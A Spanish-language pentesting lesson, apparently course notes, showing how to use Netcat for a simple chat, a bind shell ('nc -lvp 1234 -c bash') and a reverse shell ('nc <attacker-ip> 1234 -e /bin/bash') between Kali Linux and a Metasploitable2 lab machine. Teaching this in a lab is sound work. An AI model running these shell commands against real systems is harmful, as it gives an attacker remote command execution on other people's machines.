# 33. Netcat: Bind y Reverse Shell

Vamos a ver cómo utilizar la herramienta **NetCat**, vamos a hacer un chat con NetCat, y vamos a hacer una **Bind Shell** y una **Reverse Shell**.

Esto sirve mucho para **Pentesting**, para *spawnear* una shell.

## NetCat

Es una herramienta con la que nos podemos conectar entre dispositivos, hace una conexión entre 2 dispositivos y enviar datos.

Es muy sencilla, podemos utilizarla para abrir una shell, poner comandos arbitrarios, etc.

Vamos a hacer un ejemplo, una conexión sencilla con NetCat.

## Conexión sencilla con NetCat

### Metasploitable2

Primero, nos vamos a una máquina Metasploitable2, pero puede ser una máquina Linux o Windows. En este caso, 2 máquinas Linux: Kali Linux y
Metasploitable2.

Le sacamos la dirección IP a la máquina Metasploitable para luego conectarnos:

```bash
ifconfig
```

Y dejamos a la escucha de una conexión a este dispositivo por medio del puerto `1234`:

```bash
clear
nc -lvp 1234
```

* `-l`: **listening**, a la escucha de una conexión
* `-v`: **verbose**
* `-p`: Para indicar el puerto

### Kali Linux

Nos conectamos a ese dispositivo:

```bash
nc <victim-ip> 1234
```

* `1234`: Puerto

En la máquina víctima, deberíamos ver:

```plaintext
connect to [<victim-ip>] from [UNKNOWN] [<own-ip>] 33508
```

Si mandamos desde Kali Linux un:

```bash
hola
```

Se verá reflejado en la máquina Metasploitable2. Ahora, desde Metasploitable2 mandamos un:

```bash
hola2
```

Se verá reflejado en la máquina Kali Linux.

Este es un ejemplo de una conexión sencilla con NetCat.

## Abriendo una Bind Shell

**Bind Shell** significa de que la computadora atacante se va a conectar a la computadora víctima.

Quiere decir que la computadora víctima va a estar en un *listener*, a la escucha de una conexión. y la computadora atacante se va a conectar a
la computadora víctima.

En la máquina Kali Linux hacemos un:

```bash
nc -h
```

Para ver todas las opciones, y en la parte:

* `-c`: Es para ejecutar comandos

En la máquina Metasploitable2 hacemos:

```bash
nc -lvp 1234 -c bash
```

En este caso, el comando que se va a ejecutar es `bash`, que en este caso se van a ejecutar comandos de la consola de Linux.

Es decir, en la maquína víctima vamos a estar a la escucha de una conexión que se realice y vamos a otrogar acceso a la consola, al `bash`
que es la consola de Linux y vamos a poder ejecutar comandos en la máquina víctima.

Y en la máquina Kali Linux, nos vamos a conectar en la máquina víctima:

```bash
nc <victim-ip> 1234
```

Ahora, ejecutamos un comando sencillo:

```bash
ls
```

Veremos el directorio `vulnerable`. Hacemos un:

```bash
ls -l
```

veremos los permisos que tiene el directorio. Hacemos un:

```bash
pwd
```

Veremos el directorio en el que estamos: `/home/msfadmin`. Hacemos un:

```bash
whoami
```

Tenemos los permisos del usuario `msfadmin`. Ejecutamos un:

```bash
ifconfig
```

Para ver la configuración de red. Podemos crear carpetas:

```bash
mkdir carpeta
ls
```

Veremos las carpetas `carpeta` y `vulnerable`. Podemos ejecutar cualquier tipo de comando en la computadora de la víctima:

```bash
uname -r
```

Nos devuelve `2.6.24-16-server`.

## Abriendo una Reverse Shell

Es cuando la víctima se conecta a nosotros, es una *conexión reversa*.

En la computadora atacante Kali Linux, hacemos:

```bash
nc -lvp 1234
```

>El **modo verbose**, es como el modo explicativo (muestra el output)

Y en la computadora víctima Metasploitable2, hacemos:

```bash
nc <attacker-ip> 1234 -e /bin/bash
```

* `-e`: Otorgar acceso a la consola, para ejecutar el comando `/bin/bash`
* `/bin/bash`: Directorio en donde se encuentra el archivo `bash` en el cual podemos ejecutar los comandos

Una vez hecha la conexión, vamos a la computadora atacante y ponemos un comando cualquiera:

```bash
ls
```

Veremos las carpetas `carpeta` y `vulnerable`. Ponemos un:

```bash
pwd
```

Veremos el directorio en el que estamos: `/home/msfadmin`. Podemos movernos en las carpetas:

```bash
cd carpeta
ls
```

Está vacía. Cremos un archivo:

```bash
touch archivo
ls
```

Veremos `archivo`. Hacemos:

```bash
cd ..
ls
```

Veremos las carpetas `carpeta` y `vulnerable`. Podemos ejecutar cualquier tipo de comando.